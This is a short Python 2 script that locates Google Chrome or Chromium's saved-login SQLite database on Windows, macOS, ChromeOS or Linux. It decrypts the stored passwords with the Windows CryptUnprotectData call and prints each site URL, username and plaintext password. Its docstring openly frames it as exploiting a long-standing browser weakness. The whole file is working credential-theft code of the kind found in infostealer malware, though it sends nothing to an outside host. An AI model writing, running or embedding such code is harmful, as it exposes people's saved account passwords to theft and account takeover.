class AccessError(Exception):
    pass


def retgcstoredpasswds(platform,version='chrome'):

    """
    Function that will fetch (if any) stored passwords from within Google Chrome's sqlite3 database for the user running the process.

    Results are returned as a set - URL, Username, Password.

    Tested against GC 47.0.2526.106 m, Issue dates back to at least 27.0.1453.110, fix unlikely, as google assign as not a threat.

    Should work against any chromuim based browser produced in that time, unless the developer handles saved passwords differently.
    """

    from os import getenv, path as pt
    from sqlite3 import connect as sqconnect
    from win32crypt import CryptUnprotectData as dc

    if version == 'chrome': fpath = '\\Google\\Chrome\\'
    else: fpath = '\\Chromium\\'

    #need to update platform check to returned value of platfor.version() for the respective os.

    results = []
    if platform == '6.1.7601':path = getenv("APPDATA") + "\\..\\Local\\" + fpath + "User Data\\Default\\Login Data"
    elif platform == '5.1.2600':path = 'C:\\Documents and Settings\\' + getenv('USERNAME') + '\\Local Settings\\Application Data' + fpath + 'User Data\\Default\\Login Data'
    elif platform == 'osx':path = getenv('HOME') + '/Library/Application Support/' + fpath + '/Default/Login Data'
    elif platform == 'chros': path = '/home/chronos/Login Data'
    elif platform == 'nix':
        if version == 'chrome': fpath = 'google-chrome'
        else: fpath = 'chromium'
        path = getenv('HOME') + '/.config/' + fpath + '/Default/Login Data'
    else: raise ValueError('Browser type not understood or supported.')
    if pt.exists(path):
        connect = sqconnect(path)
        cursor = connect.cursor()
        try:
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        except:
            raise AccessError("Chrome or other user accesing db")
        for result in cursor.fetchall():
            password = dc(result[2], None, None, None, 0)[1]
            if password:
                results.append((result[0], result[1], password))
        
        return results
    else:
        raise AccessError("Chrome does not appear to be installed at default path for your platform")
        



if __name__ == "__main__":
    
    #for result in retgcstoredpasswds('win6x'): # Windows Vista +
    for result in retgcstoredpasswds('6.1.7601'): # Windows XP -
        print result[0], result[1], result[2] + "\n\n"
